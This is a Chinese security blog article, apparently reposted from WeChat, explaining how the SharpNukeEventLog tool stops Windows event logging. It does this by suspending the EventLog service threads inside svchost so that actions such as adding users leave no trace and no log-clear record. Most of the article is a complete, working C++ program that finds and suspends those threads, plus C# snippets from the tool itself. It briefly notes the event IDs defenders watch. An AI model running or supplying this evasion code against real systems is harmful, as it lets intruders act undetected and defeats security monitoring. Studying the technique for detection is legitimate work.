> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/jXnNwCMt1B3q_5mCwiIIIw)

Github 上了一个名叫 SharpNukeEventLog 的项目，目的是在执行敏感操作时不会产生 windows 日志记录。地址为：

https://github.com/jfmaes/SharpNukeEventLog 本文将从原理的角度简析该工具的原理。

我们平时在进行 windows 的操作时都会产生对应的 windows 日志记录，以添加用户为例，

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08UnQu6Puibf9lloxkpPmTo2TBeVWdjVI7YicrzvxO274gjJS3TyL9z8Y5zHibSiax50WYaFy8aEibibCF1A/640?wx_fmt=png)

我们会在安全目录下产生 6 条事件记录，作为蓝队可以着重关注 4720、4722、4724 这三条日志记录。即使使用一些方法清除日志，也会留下 id 为 1102 的清除日志的记录。

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08UnQu6Puibf9lloxkpPmTo2TAOYKkXEU2tkjfepngfibwibA0mviaPNKyFRqj3JZYqB7B7vWcdbxpeqqg/640?wx_fmt=png)

而该工具则可以免除该问题，在 windows 中日志记录是依靠服务来进行生效的，其服务名称为：Windows Event Log

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08UnQu6Puibf9lloxkpPmTo2TYodH6RaBfwlUpdg8hvEiaaP3RiazGNKQVlUFDfG5ZfhWyeVK3JylFpCg/640?wx_fmt=png)

进程名为 svchost.exe，我们可以用下面的命令来具体查看是那个进程负责该服务：

```
Get-WmiObject -Class win32_service -Filter "name = 'eventlog'" | select -exp ProcessId
```

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08UnQu6Puibf9lloxkpPmTo2T7MJSYbac0oI36nUicCJjiaMSEaUxbOUlIf2ktgtZtHA0gNicojMyj4NjA/640?wx_fmt=png)

那我们的 2224 进程就是负责日志记录的进程，使用 process hacker 可以清除的看到其服务名及 address（wevtsvc.dll）

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08UnQu6Puibf9lloxkpPmTo2Twc9iamVG6mPo8CcMY5sv769fk1cZaOMN03k9nccuujoJIiaiaMCXvnpPA/640?wx_fmt=png)

那我们就可以遍历服务，查找进程，查找线程，查找地址，挂起线程，核心 api 为

```
DWORD SuspendThread(
  HANDLE hThread
);
```

流程如下：

1、使用 OpenSCManagerA 打开服务管理器

2、使用 OpenServiceA 打开 eventlog 服务

3、使用 QueryServiceStatusEx 查找进程 ID

4、遍历进程中的内容，得到线程内容，使用 SuspendThread 挂起指定线程。

C++ 版 demo，代码来自 ired.team

```
#include <iostream>
#include <Windows.h>
#include <Psapi.h>
#include <TlHelp32.h>
#include <dbghelp.h>
#include <winternl.h>

#pragma comment(lib, "DbgHelp")

using myNtQueryInformationThread = NTSTATUS(NTAPI*)(
  IN HANDLE          ThreadHandle,
  IN THREADINFOCLASS ThreadInformationClass,
  OUT PVOID          ThreadInformation,
  IN ULONG           ThreadInformationLength,
  OUT PULONG         ReturnLength
  );

int main()
{
  HANDLE serviceProcessHandle;
  HANDLE snapshotHandle;
  HANDLE threadHandle;

  HMODULE modules[256] = {};
  SIZE_T modulesSize = sizeof(modules);
  DWORD modulesSizeNeeded = 0;
  DWORD moduleNameSize = 0;
  SIZE_T modulesCount = 0;
  WCHAR remoteModuleName[128] = {};
  HMODULE serviceModule = NULL;
  MODULEINFO serviceModuleInfo = {};
  DWORD_PTR threadStartAddress = 0;
  DWORD bytesNeeded = 0;

  myNtQueryInformationThread NtQueryInformationThread = (myNtQueryInformationThread)(GetProcAddress(GetModuleHandleA("ntdll"), "NtQueryInformationThread"));

  THREADENTRY32 threadEntry;
  threadEntry.dwSize = sizeof(THREADENTRY32);

  SC_HANDLE sc = OpenSCManagerA(".", NULL, MAXIMUM_ALLOWED);
  SC_HANDLE service = OpenServiceA(sc, "EventLog", MAXIMUM_ALLOWED);

  SERVICE_STATUS_PROCESS serviceStatusProcess = {};

  # Get PID of svchost.exe that hosts EventLog service
  QueryServiceStatusEx(service, SC_STATUS_PROCESS_INFO, (LPBYTE)&serviceStatusProcess, sizeof(serviceStatusProcess), &bytesNeeded);
  DWORD servicePID = serviceStatusProcess.dwProcessId;

  # Open handle to the svchost.exe
  serviceProcessHandle = OpenProcess(MAXIMUM_ALLOWED, FALSE, servicePID);
  snapshotHandle = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);

  # Get a list of modules loaded by svchost.exe
  EnumProcessModules(serviceProcessHandle, modules, modulesSize, &modulesSizeNeeded);
  modulesCount = modulesSizeNeeded / sizeof(HMODULE);
  for (size_t i = 0; i < modulesCount; i++)
  {
    serviceModule = modules[i];

    # Get loaded module's name
    GetModuleBaseName(serviceProcessHandle, serviceModule, remoteModuleName, sizeof(remoteModuleName));

    if (wcscmp(remoteModuleName, L"wevtsvc.dll") == 0)
    {
      printf("Windows EventLog module %S at %p\n\n", remoteModuleName, serviceModule);
      GetModuleInformation(serviceProcessHandle, serviceModule, &serviceModuleInfo, sizeof(MODULEINFO));
    }
  }

  # Enumerate threads
  Thread32First(snapshotHandle, &threadEntry);
  while (Thread32Next(snapshotHandle, &threadEntry))
  {
    if (threadEntry.th32OwnerProcessID == servicePID)
    {
      threadHandle = OpenThread(MAXIMUM_ALLOWED, FALSE, threadEntry.th32ThreadID);
      NtQueryInformationThread(threadHandle, (THREADINFOCLASS)0x9, &threadStartAddress, sizeof(DWORD_PTR), NULL);
      
      # Check if thread's start address is inside wevtsvc.dll memory range
      if (threadStartAddress >= (DWORD_PTR)serviceModuleInfo.lpBaseOfDll && threadStartAddress <= (DWORD_PTR)serviceModuleInfo.lpBaseOfDll + serviceModuleInfo.SizeOfImage)
{
        printf("Suspending EventLog thread %d with start address %p\n", threadEntry.th32ThreadID, threadStartAddress);

        # Suspend EventLog service thread
        SuspendThread(threadHandle);
        Sleep(2000);
      }
    }
  }

  return 0;
}
```

现在让我们回到 SharpNukeEventLog，其 Program.cs 为核心代码，STRUCTS.cs 为定义的结构体，而 win32 api 的调用利用的是 DInvoke，与 C++ 版本不同的是，其查找进程的方法为直接调用的 WMI，这也是 C# 的优点，核心函数如下：

```
public static int GetEventLogPid()
        {
            int pid = 0;
            ManagementObjectSearcher mgmtObjSearcher = new ManagementObjectSearcher("SELECT ProcessId FROM Win32_service WHERE name = \'eventlog\'");
            ManagementObjectCollection eventlogCollectors = mgmtObjSearcher.Get();
            //long live IEnumerables...
            if (eventlogCollectors.Count != 1)
            {
                throw new Exception("there should only be one eventlog collector on the system");
            }
            foreach (ManagementObject eventlogcollector in eventlogCollectors)
            {
                object o = eventlogcollector["ProcessId"];
                pid = Convert.ToInt32(o);
                //pid = Convert.ToUInt32((uint)eventlogcollector["ProcessId"]);
            }
            Console.WriteLine("target found, nuke launched on the eventlog threads of PID: " + pid);
            return pid;
        }
```

后面的就没什么的不同了，最后使用 SuspendThread 挂起线程。

```
Generic.DynamicAPIInvoke("kernel32.dll", "SuspendThread", typeof(DELEGATES.SuspendThread), ref suspendParams, true);
```

demo：

![](https://mmbiz.qpic.cn/mmbiz_gif/mj7qfictF08UnQu6Puibf9lloxkpPmTo2TdVSH217jfocXdEpIcibkSNtgkV9TGamqRbjpUHBBQrtUHMicps37JKaw/640?wx_fmt=gif)

参考文章：

https://www.ired.team/offensive-security/defense-evasion/disabling-windows-event-logs-by-suspending-eventlog-service-threads

https://github.com/jfmaes/SharpNukeEventLog

https://artofpwn.com/phant0m-killing-windows-event-log.html

https://zhuanlan.kanxue.com/article-10729.htm

https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-suspendthread

     ▼

更多精彩推荐，请关注我们

▼

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08XZjHeWkA6jN4ScHYyWRlpHPPgib1gYwMYGnDWRCQLbibiabBTc7Nch96m7jwN4PO4178phshVicWjiaeA/640?wx_fmt=png)